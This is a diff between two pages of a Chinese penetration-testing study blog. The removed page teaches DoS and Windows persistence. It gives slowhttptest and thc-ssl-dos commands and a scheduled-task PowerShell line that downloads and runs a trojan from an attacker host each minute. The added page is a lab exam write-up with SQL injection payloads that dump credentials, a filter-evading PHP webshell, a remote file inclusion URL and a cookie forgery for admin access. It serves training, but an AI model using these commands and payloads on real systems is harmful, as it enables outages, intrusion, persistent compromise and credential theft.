@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
-<title>1.14 自启动和DOS攻击初步</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="试题一：sql注入 心路历程：\n随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和2.1 综合练习中一致，甚至要更简单。\n">
+<title>2.3-SP PTE模拟全WP</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.14 自启动和DOS攻击初步">
-<meta property='og:description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="2.3-SP PTE模拟全WP">
+<meta property='og:description' content="试题一：sql注入 心路历程：\n随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和2.1 综合练习中一致，甚至要更简单。\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-16T18:07:16&#43;08:00'/><meta property='article:modified_time' content='2025-12-16T18:07:16&#43;08:00'/>
-<meta name="twitter:title" content="1.14 自启动和DOS攻击初步">
-<meta name="twitter:description" content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-02-03T20:40:01&#43;08:00'/><meta property='article:modified_time' content='2026-02-03T20:40:01&#43;08:00'/>
+<meta name="twitter:title" content="2.3-SP PTE模拟全WP">
+<meta name="twitter:description" content="试题一：sql注入 心路历程：\n随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和2.1 综合练习中一致，甚至要更简单。\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,25 +319,12 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#dos拒绝服务攻击">DOS拒绝服务攻击</a>
-      <ol>
-        <li><a href="#ssl-dos">ssl-dos</a></li>
-        <li><a href="#慢速攻击">慢速攻击</a>
-          <ol>
-            <li><a href="#slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）</a></li>
-            <li><a href="#slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）</a></li>
-          </ol>
-        </li>
-      </ol>
-    </li>
-    <li><a href="#其他内容">其他内容</a>
-      <ol>
-        <li><a href="#驱动级文件保护软件">驱动级文件保护软件</a></li>
-        <li><a href="#注册表自启动">注册表自启动</a></li>
-        <li><a href="#计划任务启动">计划任务启动</a></li>
-        <li><a href="#服务启动">服务启动</a></li>
-      </ol>
-    </li>
+    <li><a href="#试题一sql注入">试题一：sql注入</a></li>
+    <li><a href="#试题二文件上传">试题二：文件上传</a></li>
+    <li><a href="#试题三文件包含">试题三：文件包含</a></li>
+    <li><a href="#试题四反序列化">试题四：反序列化</a></li>
+    <li><a href="#试题五失效的访问控制">试题五：失效的访问控制</a></li>
+    <li><a href="#参考文献">参考文献</a></li>
   </ol>
 </nav>
         </div>
@@ -360,8 +347,8 @@
                 网安
             </a>
         
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
-                渗透测试微专业
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -369,7 +356,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">1.14 自启动和DOS攻击初步</a>
+            <a href="/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/">2.3-SP PTE模拟全WP</a>
         </h2>
     
         
@@ -391,7 +378,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-12-16 | 18:07</time>
+                <time class="article-time--published">2026-02-03 | 20:40</time>
             </div>
         
 
@@ -414,175 +401,130 @@
     <section class="article-content">
     
     
-    <h2 id="dos拒绝服务攻击">DOS拒绝服务攻击
-</h2><h3 id="ssl-dos">ssl-dos
-</h3><p>一般用于打击https网站，如果目标挂了CDN无效</p>
-<p>安装：执行<code>sudo apt-get install thc-ssl-dos</code>安装程序</p>
-<p>攻击：</p>
+    <h2 id="试题一sql注入">试题一：sql注入
+</h2><p><strong>心路历程：</strong></p>
+<p>随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和<a class="link" href="https://www.retr0.xyz/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/"  target="_blank" rel="noopener"
+    >2.1 综合练习</a>中一致，甚至要更简单。</p>
+<p>但是我浪费了好几分钟，发现是单词拼错了。。。😵</p>
+<p><strong>Write up：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">123&#39;,&#39;haha&#39;),(&#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&#39;,database(),&#39;test
+</span></span><span class="line"><span class="cl">//2web
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">123&#39;,&#39;haha&#39;),(&#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&#39;,(select
+</span></span><span class="line"><span class="cl">group_concat(table_name) from information_schema.tables where
+</span></span><span class="line"><span class="cl">table_schema=database()),&#39;test
+</span></span><span class="line"><span class="cl">//article,article1, users1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">123&#39;,&#39;haha&#39;),(&#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&#39;,(select
+</span></span><span class="line"><span class="cl">group_concat(column_name) from information_schema.columns where
+</span></span><span class="line"><span class="cl">table_name=&#39;users1&#39; and table_schema=database()),&#39;test
+</span></span><span class="line"><span class="cl">//username, password
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">123&#39;,&#39;haha&#39;),(&#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&#39;,(select
+</span></span><span class="line"><span class="cl">group_concat(username) from 2web.users1),&#39;test //admin,haha
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">123&#39;,&#39;haha&#39;),(&#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&#39;,(select
+</span></span><span class="line"><span class="cl">group_concat(password) from 2web.users1),&#39;test
+</span></span><span class="line"><span class="cl">//key1:u9y8tr4n,202cb962ac59075b964b07152d234b70
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="试题二文件上传">试题二：文件上传
+</h2><p><strong>心路历程：</strong></p>
+<p>为了方便干脆直接上图片马吧，反正难得能过简单的肯定也能过，遂打开画图画了个OK保存，然后用notepad++在末尾加上了一句话木马。发现不行，传不上去，woc，这么牛逼吗。经过一波测试，反正最终发现应该是对<code>eval</code>进行了关键词屏蔽，所以使用大写绕过。传上去正常菜刀/蚁剑连接即可。</p>
+<p><strong>Write up：</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">thc-ssl-dos <span class="o">[</span>目标ip<span class="o">]</span> <span class="m">443</span> --accept
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php EvAl($_POST[&#39;cmd&#39;]);?&gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="慢速攻击">慢速攻击
-</h3><p><strong>安装程序：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt-get install openssl
-</span></span><span class="line"><span class="cl">sudo apt-get install libssl-dev
-</span></span><span class="line"><span class="cl">sudo apt-get install slowhttptest
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）
-</h4><p><strong>攻击命令：</strong></p>
+</div><h2 id="试题三文件包含">试题三：文件包含
+</h2><p><strong>心路历程：</strong></p>
+<p><strong>我是傻逼！</strong></p>
+<p>最初尝试远程文件包含（用自己博客上提前传好的），猛然醒悟公网肯定没开，所以转而用python开本地服务器。发现攻击机上的居然是远古的python2！然后，然后怎么包含不了啊？那大概是服务端配置关了，换伪协议吧，各种绕过也不行。回到远程文件包含。</p>
+<p>重点来了，众所周知靶机是内网的一个服务器，而我提交包含文件URL里IP是127.0.0.1，靶机收到参数后理所应当的会在自己本地查找这个文件而不是来我搭建的服务器上找。。。<code>ipconfig</code>查找到同网段IP后更换一下就行了，依旧菜刀连接拿下。</p>
+<p><strong>Write up：</strong></p>
+<p>本地开单独文件夹创建文件<code>niaho.txt</code>，写入：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -B -g -o body_states -i <span class="m">110</span> -r <span class="m">200</span> -s <span class="m">8192</span> -t FAKEVERB -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">10</span> -p <span class="m">3</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>参数解释：</strong></p>
-<div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>参数</th>
-          <th>英文全称/含义</th>
-          <th>具体作用</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>-c 2000</code></td>
-          <td><code>connections</code>（并发连接数）</td>
-          <td>指定向目标服务器同时建立<strong>2000个并发HTTP连接</strong>，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。</td>
-      </tr>
-      <tr>
-          <td><code>-B</code></td>
-          <td><code>Body attack</code>（慢POST攻击）</td>
-          <td>明确攻击类型为<strong>Slow POST（慢POST攻击）</strong>（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。</td>
-      </tr>
-      <tr>
-          <td><code>-g</code></td>
-          <td><code>generate statistics</code>（生成统计日志）</td>
-          <td>启用日志记录功能，会生成<strong>CSV格式的原始数据文件</strong>和<strong>HTML格式的可视化报告</strong>，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。</td>
-      </tr>
-      <tr>
-          <td><code>-o body_states</code></td>
-          <td><code>output prefix</code>（输出文件前缀）</td>
-          <td>指定日志文件的前缀为<code>body_states</code>，结合<code>-g</code>参数，会生成<code>body_states.csv</code>（数据文件）和<code>body_states.html</code>（可视化报告）两个文件。</td>
-      </tr>
-      <tr>
-          <td><code>-i 110</code></td>
-          <td><code>interval</code>（数据块发送间隔）</td>
-          <td>指定每次发送请求体数据块之间的<strong>时间间隔为110毫秒（ms）</strong>。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。</td>
-      </tr>
-      <tr>
-          <td><code>-r 200</code></td>
-          <td><code>rate</code>（每秒新建连接数）</td>
-          <td>指定<strong>每秒向目标新建200个连接</strong>，直到达到<code>-c 2000</code>的并发连接上限（约10秒可达到2000个并发）。</td>
-      </tr>
-      <tr>
-          <td><code>-s 8192</code></td>
-          <td><code>content length size</code>（内容长度）</td>
-          <td>在HTTP请求头的<code>Content-Length</code>字段中声明<strong>预期发送8192字节（8KB）的请求体</strong>，欺骗服务器保持连接等待接收完整数据。</td>
-      </tr>
-      <tr>
-          <td><code>-t FAKEVERB</code></td>
-          <td><code>HTTP verb</code>（HTTP方法）</td>
-          <td>指定HTTP请求使用<strong>伪造的非标准方法</strong><code>FAKEVERB</code>（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。</td>
-      </tr>
-      <tr>
-          <td><code>-u http://[目标ip]</code></td>
-          <td><code>URL</code>（目标地址）</td>
-          <td>指定<strong>攻击目标的URL</strong>，需将<code>[目标ip]</code>替换为实际的服务器IP或域名。</td>
-      </tr>
-      <tr>
-          <td><code>-x 10</code></td>
-          <td><code>block size</code>（数据块长度）</td>
-          <td>指定每次向服务器发送的<strong>请求体数据块长度为10字节</strong>。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。</td>
-      </tr>
-      <tr>
-          <td><code>-p 3</code></td>
-          <td><code>probe timeout</code>（探测超时时间）</td>
-          <td>在发起正式攻击前，工具会先发送一个<strong>探测请求</strong>检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。</td>
-      </tr>
-  </tbody>
-</table></div>
-<p><strong>原理解析：</strong> 发送 POST 请求时，在请求头中声明<code>Content-Length: 8192</code>（要发 8KB 数据），然后以 <strong>10 字节 / 110ms</strong> 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。</p>
-<h4 id="slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）
-</h4><p><strong>攻击命令：</strong></p>
+</div><p>python开服务器：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -H -g -o my_header_states -i <span class="m">10</span> -r <span class="m">1000</span> -s <span class="m">8192</span> -t GET -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">24</span> -p <span class="m">3</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python -m SimpleHTTPServer 8000
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><strong>原理解析：</strong> 发送 GET 请求时，故意 <strong>逐个缓慢发送 HTTP 请求头字段</strong> （如<code>Host:</code>、<code>User-Agent:</code>、<code>Accept:</code>等），每个字段大小为 24 字节，发送间隔仅 10ms（看似快，但对服务器的连接处理机制而言，仍足够慢以占用连接），且不发送请求头的结束标记（<code>\r\n\r\n</code>），让服务器认为请求头还在传输中，从而一直保持连接等待完整的请求头。</p>
-<h2 id="其他内容">其他内容
-</h2><h3 id="驱动级文件保护软件">驱动级文件保护软件
-</h3><p>使用 **Easy File Locker ** 可以对我们的文件进行驱动级的保护和隐藏，当然包括我们放在目标上的木马程序。</p>
-<p>当配置完毕（或我们自己中招）后，我们可以检查下面两个文件夹看看是否真的生效了</p>
-<p><code>C:/Windows/xlfks.xxx</code>(包括但不限于dat、dll、ini、log&hellip;&hellip;)</p>
-<p><code>C:/Windows/system32/drivers/xlkfs.sys</code></p>
-<p>如果检查出上面两个文件就说明是驱动级的文件隐藏</p>
-<hr>
-<p><strong>如何清除：</strong></p>
-<ol>
-<li>查询服务状态<code>sc qc xlkfs</code></li>
-<li>停止服务<code>net stop xlkfs</code></li>
-<li>删除服务<code>sc delete xlkfs</code></li>
-<li>找到上面的两位个文件残余并删除</li>
-<li>删除木马程序</li>
-</ol>
-<h3 id="注册表自启动">注册表自启动
-</h3><p><code>Win+R</code>输入regedit回车打开注册表</p>
-<p><strong>路径一：</strong></p>
-<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p>
-<p><strong>路径二：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
-<p><strong>路径三：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
-<p><strong>路径四：</strong></p>
-<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
-<p><strong>路径五：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Environment</code></p>
-<p>**说明：**路径三、四、五内的条目都是Windows在登录时会执行的任务</p>
-<p>右键新建字符串值，在数据中输入要自启动的文件路径和启动参数</p>
-<h3 id="计划任务启动">计划任务启动
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">1</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;示例名称&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe -nop -w hidden
-</span></span></span><span class="line"><span class="cl"><span class="s2">-c \&#34;</span><span class="n">IEX</span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;http://[攻击机ip]/
-</span></span></span><span class="line"><span class="cl"><span class="s2">[木马文件]&#34;</span><span class="p">\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;))\&#34;&#34;
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>上面的代码会让目标每分钟在后台下载并执行攻击者的木马程序</p>
-<h3 id="服务启动">服务启动
-</h3><p>增加一个服务</p>
-<p><code>sc create &quot;示例名称&quot; binpath= &quot;cmd /c start 具体命令&quot;</code></p>
-<p>设置服务描述</p>
-<p><code>sc description 示例名称 &quot;示例描述&quot;</code></p>
-<p>设置自动启动</p>
-<p><code>sc config 示例名称 start= auto</code></p>
-<p>开启服务</p>
-<p><code>net start 示例名称</code></p>
+</div><p>记得ipconfig看看同网段的IP为<code>127.16.1.87</code></p>
+<p>最终的地址为：<code>http://172.16.1.19:83/start/index.php?page=http://172.16.1.87:8000/nihao</code></p>
+<p>菜刀连接拿下。</p>
+<h2 id="试题四反序列化">试题四：反序列化
+</h2><p><strong>心路历程：</strong></p>
+<p>没过脑子把代码抄到本地（OCR太难用了），抄到一般发现是原题，不过就算第一次见也很简单。</p>
+<p><strong>Write up：</strong></p>
+<p>见<a class="link" href="https://www.retr0.xyz/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/"  target="_blank" rel="noopener"
+    >2.1 综合练习</a></p>
+<h2 id="试题五失效的访问控制">试题五：失效的访问控制
+</h2><p><strong>心路历程：</strong></p>
+<p>还没来得及抓包服务器就关闭了</p>
+<p><strong>Write up：</strong></p>
+<p>抓包看到了cookie：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/02/03/6981ec083049b.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>把Username的内容先URL解码，再base64解码得到内容：<code>Guest</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/02/03/6981ec08849e6.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>同理我们如法炮制把<code>Admin</code>先base64编码再URL编码得到<code>%59%57%52%74%61%57%34%3d</code>换回去就行了</p>
+<p>注意把前面的IsAdmin的值改为True，放包即可。</p>
+<h2 id="参考文献">参考文献
+</h2><p>[1] Echo_200. CISP-PTE练习篇（基础题目五：失效的访问控制）[EB/OL]. (2023-01-31)[2026-02-03]. <a class="link" href="https://blog.csdn.net/wojiaoqwe/article/details/128816906"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/wojiaoqwe/article/details/128816906</a>.</p>
 
 </section>
 
@@ -645,12 +587,12 @@
             
                 
 <article class="">
-    <a href="/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.16 Linux应急响应</h2>
+            <h2 class="article-title">2.3 代码审计</h2>
         </div>
     </a>
 </article>
@@ -658,12 +600,12 @@
             
                 
 <article class="">
-    <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/2.2-%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.15 DOS补充和Win应急响应</h2>
+            <h2 class="article-title">2.2 数字取证</h2>
         </div>
     </a>
 </article>
@@ -671,12 +613,12 @@
             
                 
 <article class="">
-    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
+    <a href="/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.13  更多木马程序</h2>
+            <h2 class="article-title">2.1 综合练习</h2>
         </div>
     </a>
 </article>
@@ -684,12 +626,12 @@
             
                 
 <article class="">
-    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
+    <a href="/p/1.31-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.12 进阶后门操作</h2>
+            <h2 class="article-title">1.31 信息搜集</h2>
         </div>
     </a>
 </article>
@@ -697,12 +639,12 @@
             
                 
 <article class="">
-    <a href="/p/1.11-linux%E6%8F%90%E6%9D%83%E7%BB%AD%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">
+    <a href="/p/1.30-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.11 Linux提权(续)和钓鱼网站</h2>
+            <h2 class="article-title">1.30 漏洞挖掘</h2>
         </div>
     </a>
 </article>
